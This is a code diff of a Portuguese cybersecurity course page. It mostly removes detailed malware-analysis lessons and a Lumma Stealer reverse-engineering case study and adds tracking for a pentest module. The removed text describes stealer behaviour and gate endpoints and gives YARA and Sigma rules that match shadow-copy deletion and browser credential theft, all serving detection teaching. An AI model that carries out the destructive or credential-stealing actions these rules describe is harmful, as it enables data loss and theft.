-						<p><strong>Técnicas de Keylogging:</strong> Ganchos de API do sistema (<code>SetWindowsHookEx</code>), leitura direta de buffers de kernel ou screenshots periódicos acoplados a OCR.</p>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('mal-5')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- M6 -->
-				<article class="lesson-card" id="mal-6">
-					<h2 class="lesson-title">
-						<span class="num-badge" style="background: var(--accent-danger);">M6</span>
-						<span>Malware de Sistema: Rootkits &amp; Bootkits UEFI</span>
-					</h2>
-					<div class="lesson-body">
-						<ul>
-							<li><strong>Rootkits em Modo Usuário:</strong> Injeção de DLLs e interceptação de chamadas (API Hooking) para mascarar processos de listagens como o Gerenciador de Tarefas.</li>
-							<li><strong>Rootkits de Kernel (Ring 0):</strong> Executam no nível mais privilegiado do processador abusando de drivers assinados vulneráveis (BYOVD — <em>Bring Your Own Vulnerable Driver</em>).</li>
-							<li><strong>Bootkits UEFI:</strong> Infectam o firmware da placa-mãe (SPI Flash) iniciando antes do sistema operacional e contornando o Secure Boot (Exemplos: <em>LoJax</em>, <em>MoonBounce</em>, <em>BlackLotus</em>).</li>
-						</ul>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('mal-6')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- M7 -->
-				<article class="lesson-card" id="mal-7">
-					<h2 class="lesson-title">
-						<span class="num-badge" style="background: var(--accent-danger);">M7</span>
-						<span>Artefatos Forenses — O que Fica para Trás</span>
-					</h2>
-					<div class="lesson-body">
-						<div class="content-table-wrap">
-							<table class="content-table">
-								<thead>
-									<tr>
-										<th>Artefato Windows</th>
-										<th>Localização</th>
-										<th>Evidência Revelada</th>
-									</tr>
-								</thead>
-								<tbody>
-									<tr>
-										<td><strong>Prefetch</strong></td>
-										<td><code>C:\Windows\Prefetch\*.pf</code></td>
-										<td>Histórico de programas executados e horários</td>
-									</tr>
-									<tr>
-										<td><strong>Event Logs</strong></td>
-										<td><code>%SystemRoot%\System32\winevt\Logs</code></td>
-										<td>Eventos de logon, serviços criados e comandos Sysmon</td>
-									</tr>
-									<tr>
-										<td><strong>Shimcache / Amcache</strong></td>
-										<td>Registro do Windows</td>
-										<td>Caminhos e metadados de executáveis instalados</td>
-									</tr>
-									<tr>
-										<td><strong>Master File Table ($MFT)</strong></td>
-										<td>NTFS Root</td>
-										<td>Registros de todos os arquivos criados/deletados</td>
-									</tr>
-									<tr>
-										<td><strong>Memória RAM</strong></td>
-										<td>Dump Volatility 3</td>
-										<td>Injeções de código (<code>malfind</code>), DLLs e chaves criptográficas</td>
-									</tr>
-								</tbody>
-							</table>
-						</div>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('mal-7')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- M8 -->
-				<article class="lesson-card" id="mal-8">
-					<h2 class="lesson-title">
-						<span class="num-badge" style="background: var(--accent-danger);">M8</span>
-						<span>Montando seu Laboratório de Análise Seguro</span>
-					</h2>
-					<div class="lesson-body">
-						<p>Arquitetura recomendada para detonação segura de amostras:</p>
-						<ul>
-							<li><strong>VM de Análise Linux:</strong> <code>REMnux</code> com ferramentas pré-instaladas (Ghidra, Radare2, PEstudio, capa, YARA, INetSim).</li>
-							<li><strong>VM Vítima Windows:</strong> Windows 10 limpo com suíte <code>FlareVM</code> instalada, Sysmon configurado e snapshots atualizados.</li>
-							<li><strong>Simulador de Internet (INetSim):</strong> O REMnux responde requisições DNS/HTTP/SMTP localmente para que o malware acredite que está conectado à internet sem enviar dados para a rede real.</li>
-						</ul>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('mal-8')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- M9 -->
-				<article class="lesson-card" id="mal-9">
-					<h2 class="lesson-title">
-						<span class="num-badge" style="background: var(--accent-danger);">M9</span>
-						<span>Análise Prática Passo a Passo &amp; Produção de IOCs</span>
-					</h2>
-					<div class="lesson-body">
-						<p>Fluxo profissional de triagem e catalogação:</p>
-						<ol>
-							<li><strong>Triagem Estática:</strong> Calcular SHA-256, inspecionar strings e rodar <code>capa</code> para identificar capacidades do binário sem executá-lo.</li>
-							<li><strong>Execução Controlada:</strong> Iniciar monitoramento simultâneo com <code>Procmon</code>, <code>Wireshark</code> e captura de memória RAM.</li>
-							<li><strong>Análise de Memória:</strong> Utilizar Volatility (<code>windows.malfind</code> e <code>windows.dlllist</code>).</li>
-							<li><strong>Geração do Relatório de IOCs:</strong> Documentar hashes, domínios C2, mutexes criados e chaves de persistência para alimentar defesas de SIEM.</li>
-						</ol>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('mal-9')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- M10 -->
-				<article class="lesson-card" id="mal-10">
-					<h2 class="lesson-title">
-						<span class="num-badge" style="background: var(--accent-danger);">M10</span>
-						<span>Casos Reais Estudados (WannaCry, NotPetya, SolarWinds)</span>
-					</h2>
-					<div class="lesson-body">
-						<ul>
-							<li><strong>WannaCry (2017):</strong> Propagação automática como worm via EternalBlue (SMB). O registro de um domínio kill-switch hardcoded desacelerou a infecção global.</li>
-							<li><strong>NotPetya (2017):</strong> Disseminado via supply chain no software fiscal M.E.Doc. Fingia ser ransomware, mas destruía irreversivelmente a estrutura do disco sem chave de recuperação.</li>
-							<li><strong>SolarWinds SUNBURST (2020):</strong> Comprometimento do pipeline de build oficial (CI/CD), distribuindo malware assinado digitalmente para mais de 18.000 organizações.</li>
-							<li><strong>BlackLotus (2023):</strong> Bootkit UEFI comercializado em fóruns que contorna o Secure Boot explorando a CVE-2023-24932.</li>
-						</ul>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('mal-10')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- M11 -->
-				<article class="lesson-card" id="mal-11">
-					<h2 class="lesson-title">
-						<span class="num-badge" style="background: var(--accent-danger);">M11</span>
-						<span>Defesa Efetiva &amp; Regras Sigma de Detecção</span>
-					</h2>
-					<div class="lesson-body">
-						<p>Como detectar comportamentos maliciosos nos logs de telemetria corporativos:</p>
-
-						<div class="code-wrapper">
-							<div class="code-header"><span>YAML — Regra Sigma para Detecção de Exclusão de Shadow Copies</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
-							<pre><code>title: VSSadmin Delete Shadows (Ransomware / Wiper Activity)
-logsource:
-  product: windows
-  service: process_creation
-detection:
-  selection:
-    CommandLine|contains: 'vssadmin delete shadows'
-  level: critical</code></pre>
-						</div>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('mal-11')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-
-				<!-- ==================== PARTE 4 ==================== -->
-				<div class="part-banner" style="border-color: var(--accent-purple); box-shadow: 0 6px 30px rgba(157, 78, 221, 0.2);">
-					<div>
-						<div class="part-banner-title">🟣 Parte 4 — Análise Guiada: Lumma Stealer (LummaC2)</div>
-						<p style="font-size: 13.5px; opacity: 0.85; margin-top: 4px;">Estudo prático completo do infostealer mais prolífico do mundo e seu desmantelamento global.</p>
-					</div>
-					<span class="part-badge" style="background: rgba(157, 78, 221, 0.2); border: 1px solid var(--accent-purple); color: var(--accent-purple) !important;">Case Real de Engenharia Reversa</span>
-				</div>
-
-				<!-- Lumma 1 -->
-				<article class="lesson-card" id="lumma-1">
-					<h2 class="lesson-title">
-						<span class="num-badge" style="background: var(--accent-purple);">L1</span>
-						<span>Contexto Operacional &amp; A Operação Global de 2025</span>
-					</h2>
-					<div class="lesson-body">
-						<p>O <strong>Lumma Stealer (LummaC2)</strong> foi o infostealer mais ativo entre 2022 e 2025, operado como Malware-as-a-Service com painéis de afiliados. Foi desmantelado em maio de 2025 em operação internacional conjunta (Microsoft DCU + Europol + DOJ), com a derrubada de ~2.300 domínios de C2 ativos.</p>
-						<p><strong>Vetores de Infecção Principais:</strong> Malvertising, falsos instaladores (Chrome/WhatsApp), campanhas <em>ClickFix</em> ("cole este comando no Executar/PowerShell"), links de cracks em vídeos do YouTube e <em>EtherHiding</em> (payloads ocultos em smart contracts da Binance Smart Chain).</p>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('lumma-1')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- Lumma 2 -->
-				<article class="lesson-card" id="lumma-2">
-					<h2 class="lesson-title">
-						<span class="num-badge" style="background: var(--accent-purple);">L2</span>
-						<span>Triagem Estática do Binário PE</span>
-					</h2>
-					<div class="lesson-body">
-						<p>Análise de características estruturais com <code>pestudio</code> e <code>capa</code>:</p>
-						<ul>
-							<li><strong>Entropia Alta (&gt; 7.0):</strong> Indica que o payload está comprimido ou criptografado por um crypter stub.</li>
-							<li><strong>Tabela de Importação Mínima:</strong> Apenas funções básicas de resolução dinâmica de APIs (<code>VirtualAlloc</code>, <code>VirtualProtect</code>, <code>LoadLibraryA</code>, <code>GetProcAddress</code>).</li>
-							<li><strong>Detecção do capa:</strong> Identifica rotinas anti-debugging (<code>IsDebuggerPresent</code>), alocação de memória executável (RWX) e resolução de APIs por hashes customizados.</li>
-						</ul>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('lumma-2')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- Lumma 3 -->
-				<article class="lesson-card" id="lumma-3">
-					<h2 class="lesson-title">
-						<span class="num-badge" style="background: var(--accent-purple);">L3</span>
-						<span>Análise Dinâmica &amp; Desempacotamento com pe-sieve</span>
-					</h2>
-					<div class="lesson-body">
-						<p>Em vez de desconstruir manualmente algoritmos criptográficos complexos de crypters, execute o binário na VM de análise e deixe-o desempacotar o payload diretamente na memória RAM:</p>
-
-						<div class="code-wrapper">
-							<div class="code-header"><span>POWERSHELL / BASH — Extração com pe-sieve</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
-							<pre><code># Na VM Windows: capturar blocos desempacotados da memória
-pe-sieve64.exe /pid <PID_DO_PROCESSO> /dir C:\lab\dump /imp 3
-
-# No REMnux: inspecionar strings do binário desempacotado
-strings -n 8 dumped.bin | grep -iE 'soft|chrom|gecko|wallet|Telegram'</code></pre>
-						</div>
-
-						<p><strong>Comportamento Típico no Procmon:</strong> Execução de <code>taskkill /f /im chrome.exe</code> para liberar locks dos bancos SQLite, leitura do arquivo <code>Local State</code> (chave DPAPI) e criação do arquivo ZIP temporário com os dados roubados.</p>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('lumma-3')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- Lumma 4 -->
-				<article class="lesson-card" id="lumma-4">
-					<h2 class="lesson-title">
-						<span class="num-badge" style="background: var(--accent-purple);">L4</span>
-						<span>Protocolo de Rede &amp; Extração de Configuração C2</span>
-					</h2>
-					<div class="lesson-body">
-						<p>No tráfego de rede (Wireshark / INetSim), o Lumma utiliza um protocolo HTTP POST em 3 estágios característicos:</p>
-						<ol>
-							<li><code>/gate/getadmin.php</code>: Handshake inicial com o painel para verificar se o IP da vítima deve ser processado.</li>
-							<li><code>/gate/bot.php</code>: Transmissão de telemetria básica da máquina infectada.</li>
-							<li><code>/gate/logs.php</code>: Upload do arquivo <code>.zip</code> protegido por senha contendo senhas, cookies e carteiras.</li>
-						</ol>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('lumma-4')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- Lumma 5 -->
-				<article class="lesson-card" id="lumma-5">
-					<h2 class="lesson-title">
-						<span class="num-badge" style="background: var(--accent-purple);">L5</span>
-						<span>Relatório IOC &amp; Mapeamento MITRE ATT&amp;CK</span>
-					</h2>
-					<div class="lesson-body">
-						<p>Táticas e técnicas do MITRE identificadas na análise técnica:</p>
-						<ul>
-							<li><strong>T1027:</strong> Obfuscated / Packed Files</li>
-							<li><strong>T1055:</strong> Process Injection</li>
-							<li><strong>T1555.003:</strong> Credentials from Web Browsers</li>
-							<li><strong>T1539:</strong> Steal Web Session Cookie</li>
-							<li><strong>T1041:</strong> Exfiltration Over C2</li>
-							<li><strong>T1070.001:</strong> Clear Windows Event Logs</li>
-						</ul>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('lumma-5')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- Lumma 6 -->
-				<article class="lesson-card" id="lumma-6">
-					<h2 class="lesson-title">
-						<span class="num-badge" style="background: var(--accent-purple);">L6</span>
-						<span>Regras YARA &amp; Detecção Comportamental Sigma</span>
-					</h2>
-					<div class="lesson-body">
-						<p>Regra YARA baseada em artefatos invariantes de memória e lógica de gate:</p>
-
-						<div class="code-wrapper">
-							<div class="code-header"><span>YARA — Regra Genérica para Lumma Stealer</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
-							<pre><code>rule Lumma_Stealer_Generic {
-    meta:
-        author = "OmniVoid Academy"
-        description = "Detecta artefatos de memória e rotas de gate do Lumma Stealer"
-    strings:
-        $gate = "/gate/logs.php" ascii
-        $tdata = "Telegram Desktop\\tdata" ascii
-        $mm = "nkbihfbeogaeaoehlefnkodbefgpgknn" ascii   // ID da extensão MetaMask
-        $lstate = "Local State" ascii
-    condition:
-        uint16(0) == 0x5A4D and 2 of them
-}</code></pre>
-						</div>
-
-						<div class="code-wrapper">
-							<div class="code-header"><span>YAML — Detecção Sigma Comportamental Correlacionada</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
-							<pre><code>title: Stealer - Matança de Navegador + Leitura de Login Data
-logsource:
-  product: windows
-  service: sysmon
-detection:
-  sel_taskkill:
-    EventID: 1
-    Image|endswith: '\taskkill.exe'
-    CommandLine|contains: '/im chrome.exe'
-  sel_login:
-    EventID: 11
-    TargetFilename|contains: 'User Data\Default\Login Data'
-  condition: sel_taskkill and (5s) sel_login
-level: critical</code></pre>
-						</div>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('lumma-6')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- Lumma 7 -->
-				<article class="lesson-card" id="lumma-7">
-					<h2 class="lesson-title">
-						<span class="num-badge" style="background: var(--accent-purple);">L7</span>
-						<span>Lições Fundamentais da Engenharia Reversa</span>
-					</h2>
-					<div class="lesson-body">
-						<div class="callout-box tip">
-							<div class="callout-header">💡 PRINCÍPIOS ESSENCIAIS PARA ANALISTAS</div>
-							1. <strong>Empacotamento não é barreira:</strong> O próprio malware desempacota o payload na memória RAM; basta coletá-lo no ponto certo com ferramentas como pe-sieve.<br>
-							2. <strong>A configuração é a joia da coroa:</strong> Domínios de C2 e protocolos de gate permitem mapear e derrubar a infraestrutura global inteira do grupo.<br>
-							3. <strong>Comportamento supera hashes estáticos:</strong> Hashes mudam a cada compilação de crypter, mas o comportamento nos logs (matança de processos + leitura de DPAPI + POST de gate) permanece consistente.<br>
-							4. <strong>A defesa real é arquitetural:</strong> Utilize chaves físicas FIDO2, autenticação sem senha e nunca armazene senhas sensíveis no navegador.
-						</div>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('lumma-7')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
+				<!-- Case Lumma -->
+				<article class="lesson-card" id="lumma-1"><h2 class="lesson-title"><span class="num-badge" style="background:var(--accent-purple);">L1</span><span>Lumma Stealer: Contexto &amp; Desmantelamento 2025</span></h2><div class="lesson-body"><p>Operação internacional Europol/DOJ, ClickFix, EtherHiding e arquitetura MaaS.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('lumma-1')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="lumma-2"><h2 class="lesson-title"><span class="num-badge" style="background:var(--accent-purple);">L2</span><span>Triagem Estática PE do Lumma</span></h2><div class="lesson-body"><p>Entropia > 7.0, imports enxutos de runtime e detecções capa de anti-debugging.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('lumma-2')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="lumma-3"><h2 class="lesson-title"><span class="num-badge" style="background:var(--accent-purple);">L3</span><span>Análise Dinâmica &amp; Desempacotamento com pe-sieve</span></h2><div class="lesson-body"><p>Extração de memória de payloads desempacotados, taskkill de navegadores e leitura de bancos SQLite.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('lumma-3')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="lumma-4"><h2 class="lesson-title"><span class="num-badge" style="background:var(--accent-purple);">L4</span><span>Protocolo HTTP POST do Gate</span></h2><div class="lesson-body"><p>Endpoints <code>/gate/getadmin.php</code>, <code>/gate/bot.php</code> e <code>/gate/logs.php</code>.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('lumma-4')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="lumma-5"><h2 class="lesson-title"><span class="num-badge" style="background:var(--accent-purple);">L5</span><span>Relatório de IOCs &amp; MITRE ATT&amp;CK</span></h2><div class="lesson-body"><p>Hashes SHA-256, domínios rotativos de C2, T1027, T1055 e T1555.003.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('lumma-5')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="lumma-6"><h2 class="lesson-title"><span class="num-badge" style="background:var(--accent-purple);">L6</span><span>Regras YARA &amp; Detecção Sigma</span></h2><div class="lesson-body"><p>Regra YARA baseada no gate e extensões de carteiras e regra Sigma correlacionando taskkill com acesso ao Login Data.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('lumma-6')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="lumma-7"><h2 class="lesson-title"><span class="num-badge" style="background:var(--accent-purple);">L7</span><span>Lições Fundamentais da Engenharia Reversa</span></h2><div class="lesson-body"><p>Comportamento supera hashes, a configuração é a joia para derrubadas de infraestrutura e a defesa real é sem senhas (FIDO2).</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('lumma-7')">✓ Marcar como Estudado</button></div></article>
 
 			</main>
 		</div>
@@ -2521,12 +2242,19 @@ level: critical</code></pre>
 
 	<script>
 		// ==================== INTERACTIVITY & STATE ====================
-		const ALL_LESSON_IDS = [
+		const PENTEST_LESSON_IDS = [
+			'pt-1', 'pt-2', 'pt-3', 'pt-4', 'pt-5', 'pt-6', 'pt-7', 'pt-8', 'pt-9',
+			'pt-10', 'pt-11', 'pt-12', 'pt-13', 'pt-14', 'pt-15', 'pt-16', 'pt-17'
+		];
+
+		const HACKING_LESSON_IDS = [
 			'hack-1', 'hack-2', 'hack-3', 'hack-4', 'hack-5', 'hack-6', 'hack-7', 'hack-8', 'hack-9', 'hack-10', 'hack-11',
 			'hack-12', 'hack-13', 'hack-14', 'hack-15', 'hack-16', 'hack-17', 'hack-18', 'hack-19', 'hack-20', 'hack-21', 'hack-22',
 			'mal-1', 'mal-2', 'mal-3', 'mal-4', 'mal-5', 'mal-6', 'mal-7', 'mal-8', 'mal-9', 'mal-10', 'mal-11',
 			'lumma-1', 'lumma-2', 'lumma-3', 'lumma-4', 'lumma-5', 'lumma-6', 'lumma-7'
 		];
+
+		const ALL_LESSON_IDS = [...PENTEST_LESSON_IDS, ...HACKING_LESSON_IDS];
 
 		function getStudiedMap() {
 			try {
@@ -2550,6 +2278,8 @@ level: critical</code></pre>
 		function updateStudiedUI() {
 			const map = getStudiedMap();
 			let studiedCount = 0;
+			let studiedPentest = 0;
+			let studiedHacking = 0;
 
 			ALL_LESSON_IDS.forEach(id => {
 				const card = document.getElementById(id);
@@ -2558,6 +2288,9 @@ level: critical</code></pre>
 
 				if (isStudied) {
 					studiedCount++;
+					if (PENTEST_LESSON_IDS.includes(id)) studiedPentest++;
+					if (HACKING_LESSON_IDS.includes(id)) studiedHacking++;
+
 					if (card) card.classList.add('studied');
 					if (checkEl) {
 						checkEl.innerText = '✓';
@@ -2577,17 +2310,26 @@ level: critical</code></pre>
 			const total = ALL_LESSON_IDS.length;
 			const percent = Math.round((studiedCount / total) * 100);
 
+			const percentPt = Math.round((studiedPentest / PENTEST_LESSON_IDS.length) * 100);
+			const percentHk = Math.round((studiedHacking / HACKING_LESSON_IDS.length) * 100);
+
 			const totalEl = document.getElementById('total-lessons-stat');
 			const countEl = document.getElementById('studied-lessons-stat');
 			const percEl = document.getElementById('percent-stat');
-			const sidePercEl = document.getElementById('sidebar-percent');
-			const sideFill = document.getElementById('sidebar-progress-fill');
 
 			if (totalEl) totalEl.innerText = total;
 			if (countEl) countEl.innerText = studiedCount;
 			if (percEl) percEl.innerText = percent + '%';
-			if (sidePercEl) sidePercEl.innerText = percent + '%';
-			if (sideFill) sideFill.style.width = percent + '%';
+
+			const ptPercEl = document.getElementById('sidebar-percent-pentest');
+			const ptFill = document.getElementById('sidebar-progress-fill-pentest');
+			if (ptPercEl) ptPercEl.innerText = percentPt + '%';
+			if (ptFill) ptFill.style.width = percentPt + '%';
+
+			const hkPercEl = document.getElementById('sidebar-percent-hacking');
+			const hkFill = document.getElementById('sidebar-progress-fill-hacking');
+			if (hkPercEl) hkPercEl.innerText = percentHk + '%';
+			if (hkFill) hkFill.style.width = percentHk + '%';
 		}
 
 		function copyCode(btn) {
@@ -2613,10 +2355,15 @@ level: critical</code></pre>
 			link.classList.add('active');
 		}
 
-		function filterLessons() {
-			const q = document.getElementById('lessonSearch').value.toLowerCase().trim();
-			const cards = document.querySelectorAll('.lesson-card');
-			const links = document.querySelectorAll('.index-item-link');
+		function filterLessons(context) {
+			const inputId = context === 'pentest' ? 'lessonSearchPentest' : 'lessonSearchHacking';
+			const containerId = context === 'pentest' ? 'module-container-pentest' : 'module-container-hacking';
+			const container = document.getElementById(containerId);
+			if (!container) return;
+
+			const q = document.getElementById(inputId).value.toLowerCase().trim();
+			const cards = container.querySelectorAll('.lesson-card');
+			const links = container.querySelectorAll('.index-item-link');
 
 			cards.forEach(card => {
 				const text = card.innerText.toLowerCase();
@@ -2641,12 +2388,12 @@ level: critical</code></pre>
 			document.querySelectorAll('.module-tab-btn').forEach(b => b.classList.remove('active'));
 			if (btn) btn.classList.add('active');
 
-			const moduleIds = ['hacking', 'dev', 'hardware', 'ai', 'gamedev'];
+			const moduleIds = ['pentest', 'hacking', 'dev', 'hardware', 'ai', 'gamedev'];
 			moduleIds.forEach(id => {
 				const el = document.getElementById('module-container-' + id);
 				if (el) {
 					if (id === moduleId) {
-						el.style.display = id === 'hacking' ? 'grid' : 'block';
+						el.style.display = (id === 'pentest' || id === 'hacking') ? 'grid' : 'block';
 					} else {
 						el.style.display = 'none';
 					}
